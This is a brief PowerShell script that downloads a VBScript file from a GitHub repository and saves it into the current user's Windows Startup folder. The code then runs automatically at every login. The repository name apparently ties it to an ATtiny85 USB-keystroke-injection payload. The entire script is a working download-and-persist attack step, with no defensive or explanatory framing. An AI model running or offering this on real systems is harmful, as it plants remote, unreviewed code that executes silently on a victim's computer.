$URL = "https://raw.githubusercontent.com/msr8/attiny85/main/Assets/yamete-3-script.vbs"
$FP  = "$env:APPDATA/Microsoft/Windows/Start Menu/Programs/Startup/yamete-3-script.vbs"

# Download the vbs file and save it in the startup directory
# https://stackoverflow.com/a/51225744/17002774
Invoke-WebRequest $URL -OutFile $FP